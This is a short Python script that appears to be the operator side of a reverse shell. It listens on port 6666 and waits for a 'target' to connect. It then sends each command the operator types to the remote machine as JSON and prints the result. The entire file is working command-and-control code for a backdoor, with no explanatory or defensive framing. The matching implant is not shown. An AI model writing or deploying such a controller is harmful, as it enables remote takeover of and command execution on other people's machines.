#!/usr/bin/python
import socket
import json


def shell():
    while True:
        cmd = input("* Shell#~%s: " % str(ip))
        reliable_send(cmd)
        print(reliable_recv())
        if cmd == "exit":
            break


def server():
    global s, target, ip
    # AF_INET=ipv4
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 6666))
    s.listen(5)  # specify the n of connection to accept
    print("Listening to incoming connections...")
    target, ip = s.accept()
    print("Target Connected")


def reliable_send(data):
    json_data = json.dumps(data).encode()
    target.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + target.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue


if __name__ == '__main__':
    server()
    shell()
    s.close()
